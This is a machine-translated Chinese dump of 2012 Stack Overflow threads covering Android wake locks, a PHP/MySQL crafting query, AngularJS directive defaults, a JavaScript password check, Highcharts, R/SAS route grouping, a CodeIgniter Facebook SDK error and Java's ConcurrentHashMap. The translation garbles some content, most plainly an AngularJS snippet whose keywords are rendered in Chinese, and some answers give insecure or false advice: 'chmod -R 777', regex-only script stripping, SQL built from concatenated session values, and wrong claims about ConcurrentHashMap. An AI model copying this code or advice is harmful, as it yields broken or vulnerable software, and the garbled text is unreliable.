        alert.setMessage("Incoming Game!");
        alert.show();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP + PowerManager.FULL_WAKE_LOCK, "myTag");
        wl.acquire();
        wl.release();
        mLastX = x;
        mLastY = y;
        mLastZ = z;
        mInitialized = true;
        // Start Second Activity
        Intent intent = new Intent(GMeter.this, nextClass.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    } else {
        float deltaX = Math.abs(mLastX - x);
        float deltaY = Math.abs(mLastY - y);
        float deltaZ = Math.abs(mLastZ - z);
        if (deltaX < NOISE)
            deltaX = (float) 0.0;
        if (deltaY < NOISE)
            deltaY = (float) 0.0;
        if (deltaZ < NOISE)
            deltaZ = (float) 0.0;
        mLastX = x;
        mLastY = y;
        mLastZ = z;
    }
}

@Override
public IBinder onBind(Intent intent) {
    // TODO Auto-generated method stub
    return null;
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:52:18.273

不，唤醒锁用于防止设备休眠。我猜你应该使用 AlarmManager 功能来唤醒你的设备并发送一个意图（带有参数`RTC_WAKEUP`）。

编辑：如果您想要您`onCreate()`的服务方法中的功能，您应该获取 PARTIAL_WAKE_LOCK 并且您应该在`onDestroy()`. 因此，您的服务将收到通知。或者您可以每隔 n 秒唤醒您的设备并检查您的传感器。

# php - 我如何回显一个名称 - 仅当一个表中的特定行基于 id 匹配另一个表中的特定行？

> ID：12646374
> 
> 赞同：0
> 
> 时间：2012-09-28T19:43:58.380
> 
> 标签：php, mysql, database, arrays

这是我的问题：我正在为游戏制作制作系统，并且我的数据库中已经充满了制作物品所需的资源信息。

这是我的相关表格的样子：

> ```
> table #edible_resources
> (edible_resource_id, edible_resource_name, hunger_points, degeneration_id)
> 
> table #edible_ground
> (id, resource, amount, location)
> 
> table #req_crafting_edible
> (req_crafting_edible_id, edible_resource_id, req_resource_amount, created_item_id)
> 
> table #items
> (item_id, item_name, degeneration_id, is_grounded, is_stackable, can_equip, can_edit) 
> ```

我想要做的是 - 仅 - 当且仅当 - 所有需要的资源（及其所需数量）都在角色位置的地面上时，才回显可制作物品的名称。

我有一个接近的查询：

```
SELECT items.item_name, items.item_id FROM items
INNER JOIN req_crafting_edible
ON req_crafting_edible.created_item_id = items.item_id
INNER JOIN edible_ground
ON edible_ground.resource = req_crafting_edible.edible_resource_id
AND edible_ground.amount >= req_crafting_edible.req_resource_amount
WHERE edible_ground.location = $current_location
GROUP BY items.item_name
ORDER BY items.item_name 
```

但这向我展示了可制作的物品，无论我是否在该地区拥有所有必需的物品。只要我拥有他们所需的资源之一，它就会向我展示项目。

只有当我在 edible_ground where location = $current_location 中拥有所有必需的资源（及其数量）时，有没有办法只显示可制作物品的名称？

有关我尝试过的更多信息：

```
$get_char = mysql_query("SELECT current_char FROM accounts WHERE account_id ='".$_SESSION['user_id']."'");
$current_char = mysql_result($get_char, 0, 'current_char');

$get_loc = mysql_query("SELECT current_location FROM characters WHERE character_id = $current_char");
$current_location = mysql_result($get_loc, 0, 'current_location');

//---------------------------------------------------------------COOKED FOOD
$get_food = mysql_query("SELECT items.item_name, items.item_id FROM items
INNER JOIN req_crafting_edible
ON req_crafting_edible.created_item_id = items.item_id
INNER JOIN edible_ground
ON edible_ground.resource = req_crafting_edible.edible_resource_id
AND edible_ground.amount >= req_crafting_edible.req_resource_amount
WHERE edible_ground.location = $current_location
GROUP BY items.item_name
ORDER BY items.item_name");
while ($food = mysql_fetch_array($get_food)){
  echo $food['item_name'].'<br>';
} 
```

这将返回：

*   烤鱼
*   烧焦的鱼
*   鱼汤
*   釉面浆果
*   蛋糕
*   烤鱼
*   生鱼片
*   海鲜汤
*   寿司
*   乌冬面

在地上：

*   1 条鱼
*   1个蜂蜜

尽管鱼汤、浆果蛋糕、乌冬面等需要的不仅仅是该地区的一条鱼。

谁能帮我解决这个问题？我将永远感激；我已经花了几天时间尝试自己。请？

在任何人说什么之前，我知道我需要开始使用 mysqli；不幸的是，当我开始制作游戏时（几个月前同时学习 PHP），我什至没有意识到它的存在，所以我不得不痛苦地回去并在更新中进行全部更改。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:15:39.073

您需要一个`HAVING`子句来检查您通过`INNER JOIN`s 分组的记录数。

```
HAVING count(*) = (
  SELECT count(*)
    FROM req_crafting_edible
    WHERE req_crafting_edible.created_item_id = items.item_id
) 
```

**编辑：**

所以基本上你需要知道两条信息：

*   需要多少不同的资源
*   这些资源中的每一个是否都有所需的数量

第一个由上面的子查询解决。

您的查询原样满足第二点，但仅适用于 1 个资源。

`HAVING`基本上对您的 group 条款有一些特殊的魔力。`HAVING count(*)`表示有 X 条记录被组合在一起。由于连接的工作方式，每个资源都有 1 个 item.name。子选择为您提供了该项目需要多少不同资源以及分组记录的计数。将该子查询与分组的 count(*) 进行比较可确保您拥有所有需要的资源。

这是最终查询，修改上面的代码：

```
SELECT items.item_name, items.item_id
  FROM items
    INNER JOIN req_crafting_edible
      ON req_crafting_edible.created_item_id = items.item_id
    INNER JOIN edible_ground
      ON edible_ground.resource = req_crafting_edible.edible_resource_id
        AND edible_ground.amount >= req_crafting_edible.req_resource_amount
  WHERE edible_ground.location = $current_location
  GROUP BY items.item_name
  HAVING count(*) = (
    SELECT count(*)
      FROM req_crafting_edible
      WHERE req_crafting_edible.created_item_id = items.item_id
  )
  ORDER BY items.item_name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:37:16.727

您实际上只需要 items 表中的数据，对吗？如果是这样，我将转向使用现有模型：

```
SELECT I.item_name, I.item_id FROM items I
WHERE NOT EXISTS 
  (SELECT created_item_id
   FROM req_crafting_edible R
   WHERE R.created_item_id = I.item_id
     AND NOT EXISTS
       (SELECT G.resource
        FROM edible_ground G
        WHERE G.resource = R.edible_resource_id
          AND edible_ground.location = $current_location
          AND G.amount >= R.req_resource_amount))
ORDER BY I.item_name 
```

我没有你的数据库来检查这个，但逻辑是这样的：

1.  找出没有任何不满足要求的项目。
2.  查找当前项目未满足的要求。（即，查找没有实地资源的需求）
3.  找到符合当前要求的可食用资源，在这个位置，并且有足够的资源。

我目前在 mysql 中工作不多，但如果这不起作用，请告诉我。

# c++ - 打包一个 c++ 项目以进行发布，其中包含一些依赖项，例如 pthread boost curl 等

> ID：12646379
> 
> 赞同：1
> 
> 时间：2012-09-28T19:44:20.517
> 
> 标签：c++

我正在编写一个 c++ 应用程序，我在其中使用了很多库，如 boost curl、pthread 等。我不确定如何将应用程序与所有依赖项打包以供生产使用。分发具有依赖关系的应用程序的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-02-12T20:17:40.000

这取决于您计划使用的平台。如果您使用 pthread，您可能针对的是 POSIX 系统。如果您打算使用 Debian，您可以将所有内容打包在一个 Deb 包中并配置该包以处理依赖关系。redhat 系统的 RPM 也是如此。我对解决 OSX 系统的最佳方法没有经验

# javascript - 有没有办法为隔离范围别名提供默认值？

> ID：12646380
> 
> 赞同：19
> 
> 时间：2012-09-28T19:44:34.760
> 
> 标签：javascript, angularjs

假设我将以下内容作为[指令](http://docs.angularjs.org/guide/directive)定义的一部分：

```
scope: {
    prop1: '@'
} 
```

如果指令没有 prop1 属性，有没有办法让 prop1 获得默认值？当然，我可以检查它是否是我自己定义的并设置它，但[属性并不总是在你期望的时候设置](https://stackoverflow.com/questions/12645968/when-do-isolated-scope-properties-actually-get-added-to-the-scope)。我只是想知道我在文档中是否遗漏了任何语法，或者是否有一种很好的标准方法来做到这一点。谢谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-08-04T17:12:38.180

这取决于您要分配的默认值。如果您想默认为父范围内的名称，则在指令的`compile`函数中设置默认属性值将起作用：

```
  编译：函数（元素，属性）{
    如果（attrs.person == 未定义）{
      attrs.$set("person", "person");
    }
  ...

```

如果您希望指令提供默认值，它会变得有点棘手，因为 Angular 不会让您分配给隔离范围内的别名（您将从试图传播的观察者那里获得“不可分配的模型表达式”异常分配给隔离的父范围）。但是，您可以通过将属性标记为可选来防止这种情况发生（这意味着当属性被省略时，Angular 不会注册侦听器）。

```
  范围： {
    人：“=？”
  },
  链接：功能（范围，元素，属性）{
    if (scope.person == undefined) {
      scope.person = "鲍勃";
    }
    ...
  }

```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-09-28T20:10:54.143

```
scope['prop1'] = scope['prop1'] || '@' 
```

# javascript - Javascript - 使用正则表达式检查密码字段

> ID：12646384
> 
> 赞同：-4
> 
> 时间：2012-09-28T19:44:41.060
> 
> 标签：javascript, html, regex, forms

我正在使用正则表达式来检查密码字段，现在测试变量的 javascript 正在工作，但是当我尝试调用它并检查表单时，我似乎无法让 javascript 看到我想要它使用我制作的 javascript 检查表单中的密码，但我似乎无法让表单与我制作的 javascript 进行通信，表单和 javascript 在同一页面上，我想要它做的是在它之后检查密码要求，它只会去提交表格。这是我到目前为止所拥有的。

```
<html>
 <body>
    <script type="text/javascript">
     function checkPassword(password)
    {
    password = document.getElementById('thethePasswordFieldField').value;   
        var patt=/[a-z]/g;
        var patt2 = /[A-Z]/g; 
        var patt3 = /[0-9]/g; 
        var patt4 = /[~\!@#\$%\^&*_\-\+=`\|\\(\)\{\}\[\]:;"'<>,\.\?\/]/g; 

            var result=patt.test(password);
            var result2=patt2.test(password);
            var result3=patt3.test(password);
            var result4=patt4.test(password);

                if (!result)
            alert("Needs a lowercase & uppercase letter, a number & a special character.");

                if (!result2)
            alert("Needs a lowercase & uppercase letter, a number & a special character.");

                if (!result3)
            alert("Needs a lowercase & uppercase letter, a number & a special character.");

                if (!result4)
            alert("Needs a lowercase & uppercase letter, a number & a special character.");

                        if (result && result2 && result3 && result4)
            alert("");
            document.getElementById('frmApplication').submit();
    }
    </script>

    <form id="frmApplication" name="frmApplication" action="test.html" method="post">
    Password: <input type="text" name="thethePasswordFieldField" id="thethePasswordFieldField">  
   <a href="javascript:checkPassword()">Submit</a>
   </form>
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:49:41.407

您正在使用`getElementById`但实际上并未将 ID 属性分配给“密码”字段。

尝试：

```
<input type="password" name="thePasswordField" id="thePasswordField"/> 
```

我建议使用此约定的原因是避免使用“密码”作为您的实际字段名称（如果您使用这种方法，IE 可能会死掉），当然还要实际使用`password`类型字段。

希望您应该很明显，您的初始`getElementById`行必须引用“thePasswordField”ID 值。

我没有审查您的其余代码，但将 ID 属性放在那里并试一试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:53:05.393

在第一个标志你没有关闭所有块

```
 function checkPassword(password)
    {
.....
   { document.getElementById('frmApplication').submit();
    } 
```

在这里看到关于 regexp [how-to-validate-password-with-regular-expression](http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/)

# highcharts - 如何隐藏水平网格线在 LHS 上保持垂直 Y 轴

> ID：12646387
> 
> 赞同：-2
> 
> 时间：2012-09-28T19:44:57.103
> 
> 标签：highcharts

我有一个图表，如下所示：

[http://www.google.com/imgres?hl=en&sa=X&biw=1148&bih=538&tbm=isch&prmd=imvns&tbnid=ImVcaOUrw9RZ8M:&imgrefurl=http://peltiertech.com/WordPress/stack-columns-in-order-of- size-with-vba/&docid=Wy54Uzfs1JDBAM&imgurl=http://peltiertech.com/images/2009-05/StackChart4.png&w=502&h=331&ei=4fxlUOLCFMzSigLesIGYDQ&zoom=1&iact=hc&vpx=271&vpy=229&dur=1078&hovh=1819&27&8=1812 91&sig=113812968337335397921&page=1&tbnh=132&tbnw=199&start=0&ndsp=10&ved=1t:429,r:1,s:0,i:77](http://www.google.com/imgres?hl=en&sa=X&biw=1148&bih=538&tbm=isch&prmd=imvns&tbnid=ImVcaOUrw9RZ8M:&imgrefurl=http://peltiertech.com/WordPress/stack-columns-in-order-of-size-with-vba/&docid=Wy54Uzfs1JDBAM&imgurl=http://peltiertech.com/images/2009-05/StackChart4.png&w=502&h=331&ei=4fxlUOLCFMzSigLesIGYDQ&zoom=1&iact=hc&vpx=271&vpy=229&dur=1078&hovh=182&hovw=278&tx=195&ty=91&sig=113812968337335397921&page=1&tbnh=132&tbnw=199&start=0&ndsp=10&ved=1t:429,r:1,s:0,i:77)

但我想要一个看起来像这样的图表：[http ://www.google.com/imgres?hl=en&sa=X&biw=1148&bih=538&tbm=isch&prmd=imvns&tbnid=NFn2T8iaojOpvM:&imgrefurl=http://peltiertech.com/Utility/ClusterStackUtility html的＆的docID = _9NYGInExJfrmM＆imgUrl的HTTP =：//peltiertech.com/Utility/pix/clusterstackcolumns.png&w=282&h=207&ei=4fxlUOLCFMzSigLesIGYDQ&zoom=1&iact=hc&vpx=509&vpy=237&dur=85&hovh=166&hovw=226&tx=52&ty=80&sig=113812968337335397921&page=1&tbnh=150&tbnw =203&start=0&ndsp=10&ved=1t:429,r:2,s:0,i:80](http://www.google.com/imgres?hl=en&sa=X&biw=1148&bih=538&tbm=isch&prmd=imvns&tbnid=NFn2T8iaojOpvM:&imgrefurl=http://peltiertech.com/Utility/ClusterStackUtility.html&docid=_9NYGInExJfrmM&imgurl=http://peltiertech.com/Utility/pix/clusterstackcolumns.png&w=282&h=207&ei=4fxlUOLCFMzSigLesIGYDQ&zoom=1&iact=hc&vpx=509&vpy=237&dur=85&hovh=166&hovw=226&tx=52&ty=80&sig=113812968337335397921&page=1&tbnh=150&tbnw=203&start=0&ndsp=10&ved=1t:429,r:2,s:0,i:80)

***以上只是图表的一个示例，以显示我想要的内容。无意复制任何内容。这些是来自谷歌搜索的随机图像。

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-28T20:15:13.750

[highchart yAxis 对象](http://api.highcharts.com/highstock#yAxis)中提供了各种选项，允许您以几乎任何方式对其进行自定义。

```
 yAxis: {
        gridLineWidth: 0,
   //     tickColor: 'black',
        tickLength: 5,
        tickWidth: 1,
        tickPosition: 'outside',
        labels: {
            align: 'right',
            x:-10,
            y:5
        },
        lineWidth:1,
      //  lineColor:'black'
    } 
```

我强烈建议你看看非常有用的[highcharts api](http://api.highcharts.com/highstock)

[“隐藏网格线但保留刻度线 | Highchart 和 Highstock”@ jsFiddle](http://jsfiddle.net/jugal/djtN3/)

# r - 编程机制：分配组 ID

> ID：12646390
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:45:04.093
> 
> 标签：r, group-by, grouping, sas, stata

假设我有一些航空公司的航班数据。一个字段是始发机场，另一个字段是目的地机场。我想按路线（独特的起点到目的地组合）对观察进行分组。问题是，对于每条独特的路线，还需要包括相应的返回路线。例如，如果我有机场 A 到机场 B 进行一组观察，但在接下来的几次观察中从机场 B 到机场 A，我希望它们都具有相同的路线 ID。

我可以为此使用 SAS、Stata 或 R。即使是 Python，如果它更容易的话。

代表代码如下：

```
df1 <- structure(list(airl = c("US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", 
"US", "US", "US", "US", "US", "US", "US"), ORIGIN = c("ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "CLT", "CLT", "CLT", 
"CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", 
"CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "PHL", "PHL", "PHL", 
"PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", 
"PHL", "PHL", "PHL", "PHL", "PHL"), DESTINATION = c("CLT", "CLT", 
"CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "CLT", 
"CLT", "CLT", "CLT", "CLT", "CLT", "CLT", "PHL", "PHL", "PHL", 
"PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", "PHL", 
"PHL", "PHL", "PHL", "PHL", "PHL", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", "ABE", 
"ABE", "ABE", "ABE", "ABE"), miles = c(480, 480, 480, 480, 480, 
480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 54, 
54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 
480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 480, 
480, 480, 480, 480, 480, 54, 54, 54, 54, 54, 54, 54, 54, 54, 
54, 54, 54, 54, 54, 54, 54, 54), orig_area = c(23, 23, 23, 23, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 36, 36, 
36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 
23), dest_area = c(36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 
36, 36, 36, 36, 36, 36, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 
23, 23, 23, 23, 23, 23, 23, 23, 23, 23), month = c(1, 2, 3, 4, 
5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 10, 
11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 1, 2, 3, 4, 5, 6, 
7, 8, 9, 10, 11, 12, 1, 2, 3, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 
1, 2, 3, 4, 5, 6, 7), freq = c(88, 80, 89, 78, 88, 83, 85, 80, 
76, 79, 76, 81, 86, 65, 62, 60, 82, 137, 138, 142, 144, 149, 
147, 150, 143, 150, 138, 128, 151, 145, 148, 146, 147, 149, 79, 
76, 81, 86, 65, 62, 60, 82, 82, 82, 84, 81, 83, 81, 85, 84, 76, 
85, 143, 137, 138, 142, 143, 151, 147, 150, 143, 150, 137, 128, 
151, 145, 148, 146, 147), seats = c(8146, 7352, 7599, 6920, 6759, 
6060, 6189, 5939, 6137, 6504, 6440, 6804, 6862, 5330, 5242, 5068, 
6204, 6460, 6276, 6047, 6095, 6306, 6102, 6265, 7085, 7344, 6809, 
6348, 6965, 6626, 6893, 6741, 6765, 6865, 6504, 6440, 6804, 6862, 
5330, 5242, 5068, 6204, 6104, 6030, 6278, 6034, 6944, 6816, 6544, 
6494, 5872, 6544, 6747, 6460, 6276, 6034, 6058, 6380, 6102, 6278, 
7085, 7344, 6759, 6348, 6952, 6613, 6919, 6728, 6765), year = c(2009, 
2009, 2009, 2009, 2009, 2009, 2009, 2009, 2009, 2009, 2009, 2009, 
2010, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 
2010, 2010, 2010, 2011, 2011, 2011, 2011, 2011, 2011, 2011, 2011, 
2009, 2009, 2009, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 2010, 
2010, 2010, 2010, 2010, 2011, 2011, 2011, 2010, 2010, 2010, 2010, 
2010, 2010, 2010, 2010, 2010, 2010, 2011, 2011, 2011, 2011, 2011, 
2011, 2011)), .Names = c("airl", "ORIGIN", "DESTINATION", "miles", 
"orig_area", "dest_area", "month", "freq", "seats", "year"), class = "data.frame", row.names = c(NA, 
69L)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:18:59.123

采用最简单的标签（两个机场代码，按字母顺序列出，因此出发地和目的地无关紧要）：

```
df1$group <- apply(df1[c("ORIGIN", "DESTINATION")], 
                   1, 
                   function(cit) {paste(sort(cit),collapse="-")}) 
```

简而言之，只提取机场代码，对于每一行，按字母顺序对代码进行排序，然后用连字符将它们分开粘贴。分配该`group`变量。

```
> df1$group
 [1] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT"
 [8] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT"
[15] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL"
[22] "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL"
[29] "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-CLT"
[36] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT"
[43] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-CLT"
[50] "ABE-CLT" "ABE-CLT" "ABE-CLT" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL"
[57] "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL"
[64] "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" "ABE-PHL" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:14:56.613

在 Stata 中，您可以利用字符串之间的关系：

```
assert "ABE"<"CLT" 
```

很好，虽然当然任何

```
assert "ABE"<"CLT"
assert "ABE"<1 
```

会产生错误（第一个是假的，第二个是比较不兼容的数据类型）。因此，在 R 中反映 Brian 的建议，我们可以

```
gen str7 route = origin + "-" + destination if origin < destination & !missing(origin) & !missing(destination)
replace  route = destination + "-" + origin if destination < origin & !missing(origin) & !missing(destination)
list origin destination route if missing( route ) 
```

当然，所有缺失值检查都只是妄想症。但是谁知道你的数据有多糟糕:)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-02T03:49:32.750

一种使用`R`和的方法`data.table`（用于编码优雅和内存效率）

```
library(data.table)
DT <- as.data.table(df1)

DT[, id := paste(sort(c(ORIGIN, DESTINATION)), collapse ='-') ,
      by = list(ORIGIN, DESTINATION)] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T20:43:35.107

SAS 解决方案，使用 PROC FORMAT。我在这里采取的步骤比您可能需要的要多得多 - 只是将每个步骤分开以明确我在做什么。这将为每一对分配一个值，并将该对的两个方向分配给相同的值。

您可以通过使用格式将“ABQ-DEN”或“DEN-ABQ”转换为“ABQ-DEN”来执行与标签本身作为组定义的 R 解决方案完全相同的操作 - 这样做，但设置label=start 在 pre-proc 排序数据步骤中。您还需要将 INFORMAT 转换为 FORMAT。

```
proc format;
*What this will look like - this is an example and NOT used in the final solution;
invalue $AIRRT
'ABE-CLT'=1
'CLT-ABE'=1
'ABE-PHL'=2
'PHL-ABE'=2
'ABQ-DEN'=3
'DEN-ABQ'=3
'ABQ-ELP'=4
'ELP-ABQ'=4
'MDW-MCI'=5
;
*Only used to create sample data;
value AIRPORT
1="ABE"
2="CLT"
3="PHL"
4="ABQ"
5="ELP"
6="DEN"
7="MDW"
8="MCI"
;
quit;

*create sample data;
data have;
do _t = 1 to 100;
    origin=put(ceil(8*ranuni(7)),$AIRPORT.);
    do until (destination ne origin);
        destination=put(ceil(8*ranuni(7)),AIRPORT.);
    end;
    output;
end;
run;

*create preliminary dataset for format, creating combined field;
data for_format_pre;
 set have;
 call sortc(of origin destination);
 start = catx('-',origin,destination); 
 keep start origin destination;
run;

*sort down to one per route;
proc sort nodupkey data=for_format_pre;
 by start;
run;

*create final format dataset, with group counter;
data for_format;
set for_format_pre;
 retain fmtname "AIRRT" type 'j';
 label+1;
 output;
 start=catx('-',destination,origin);
 output;
run;

*import into formats;
proc format cntlin=for_format;
quit;

*apply to dataset;
data want;
set have;
combined=catx('-',origin,destination);
group_sort = input(combined,$AIRRT.);
drop _:;
run; 
```

# codeigniter - Facebook SDK 打破 Codeigniter？空白页

> ID：12646394
> 
> 赞同：1
> 
> 时间：2012-09-28T19:45:19.213
> 
> 标签：codeigniter, facebook-graph-api, facebook-php-sdk

我已经在本地主机上测试了我的登录脚本，没有任何问题。

我现在已经在网上上传了，可以在[这个链接上看到](http://www.gua.com/account/login/)

显然，如果您单击，您会看到显示了一个空白页面，我不知道为什么。

我做了一点内容的测试，并删除了 Facebook SDK 代码。

```
 //Facebook config (required for library)
    $fb_config = array(
            'appId'  => 'REMOVED',
            'secret' => 'REMOVED'
            );

    //Load Facebook library
    $this->load->library('facebook', $fb_config);

    //SET FACEBOOK USER 
    $fbuser = array();
    $fbuser = $this->facebook->getUser(); 
```

当上述代码不存在时，页面加载。

我已经正确更新了我的应用程序设置，即将网站 URL 更改`http://localhost`为[http://gua.com](http://gua.com)所以我不相信是这样。

我什至更改了 CI 设置以显示所有错误 - 没有显示任何内容。

有没有人对为什么上述代码仅在在线托管时才加载空白页面有任何建议？

非常感谢托马斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:28:29.713

`<?php ?>`如果您的 localhost 是 Windows 机器，而您的远程主机是 *NIX 系统，则有可能在标签之外的 SDK 文件中引入了一些额外的空白。当输出此空白并设置标题时，这有时会导致“死机白屏”。

尝试从 Github 下载 SDK 的新副本，并且在它位于远程服务器上之前不要解压缩它。更好的是，如果您 ssh 访问`wget`它或`git clone`直接在那里访问它。看看是否有帮助。

如果没有，请添加`error_reporting(E_ALL)`为脚本的第一行，看看是否能告诉您任何信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T13:52:46.730

您将需要运行 chmod，例如：“sudo chmod -R 777 facebook/”。我认为这些文件是在 *Nix 系统上写入或为 windows 编写的，它在检查之前不会运行。

就我而言，在这样做之后，我开始遇到可以处理的错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-14T06:21:06.103

打开 base_facebook.php 并尝试从顶部删除这两行中的任何一行。

```
 if (!function_exists('curl_init')) {
      throw new Exception('Facebook needs the CURL PHP extension.');
    }
    if (!function_exists('json_decode')) {
      throw new Exception('Facebook needs the JSON PHP extension.');
    } 
```

如果您停止出现白屏，则表明您的服务器需要启用 curl 或 json_decode。

或者，您可以执行 a`echo phpinfo()`并检查它们是否已启用。请注意，json_decode/encode 仅在 php >=5.2 中可用

# php - PHP - 如何从 HTML 代码中删除特定标签

> ID：12646401
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:45:45.243
> 
> 标签：php, regex

如何删除每个

```
<script></script> 
```

HTML文件中的元素？我尝试了以下正则表达式：

```
 preg_replace("/<script.*\/script>/", "", $html); 
```

但它仅在代码只有 1 行时才有效。当出现 \n （换行符）时，它不想工作。有任何想法吗？？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:06:25.453

将 s 修饰符添加到您的正则表达式。s 修饰符在“.”中包含换行符。通配符。

但是你可以考虑一些像 htmlpurifier 这样的 html sanitizers，或者如果你想从 html 输入中删除一些恶意代码，你可以简单地使用 strip_tags

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:47:38.973

你可以这样做：

```
$HTML = str_replace(array("\r", "\n", "\r\n"), '', $HTML);

preg_replace("/<script.*\/script>/", "", $html); 
```

删除之前的所有断线。问题解决了。

# java - Java中的ConcurrentHashMap和Hashtable

> ID：12646404
> 
> 赞同：88
> 
> 时间：2012-09-28T19:45:54.200
> 
> 标签：java, hashmap, hashtable

Java 中的 ConcurrentHashMap 和 Hashtable 有什么区别？

哪个对线程应用程序更有效？

* * *

## 回答 #1

> 赞同：172
> 
> 时间：2015-07-23T06:16:09.947

> ConcurrentHashMap 和 Hashtable 锁定机制

*   `Hashtable`属于Collection框架；`ConcurrentHashMap`属于Executor框架。
*   `Hashtable`对整个数据使用**单个锁**。`ConcurrentHashMap`在段级别使用**多个锁**（默认为 16 个）而不是对象级别，即整体`Map`。
*   `ConcurrentHashMap`锁定仅适用于更新。在检索的情况下，它允许完全并发，检索反映最近完成的更新操作的结果。因此，当使用锁完成写入时，读取可能会非常快。
*   `ConcurrentHashMap``ConcurrentModificationException`如果一个线程尝试修改它，而另一个线程正在迭代它并且不允许空值，则不会抛出。
*   `ConcurrentHashMap`return ，它在并发修改时`Iterator`是故障安全的（即迭代器将复制内部数据结构）。
*   `ConcurrentHashMap`使用数据库分片逻辑（`Segment<K, V>[] segments`）被称为**并发级别**，即将数据划分为分片（段），然后在每个分片（段）上加锁，而不是为整个数据加一个锁（`Map`）。默认值为 16。

要从技术上更深入地了解 ConcurrentHashMap，请查看此[链接](http://howtodoinjava.com/2013/05/27/best-practices-for-using-concurrenthashmap/)

**以下类比可帮助您仅了解概念（而非逻辑）**

*   假设`Hashtable`和`ConcurrentHashMap`是两种类型的家。
*   `Hashtable`锁住家的大门。
*   `ConcurrentHashMap`锁定特定的房间门而不是大门。

> 哪个对线程应用程序更有效？

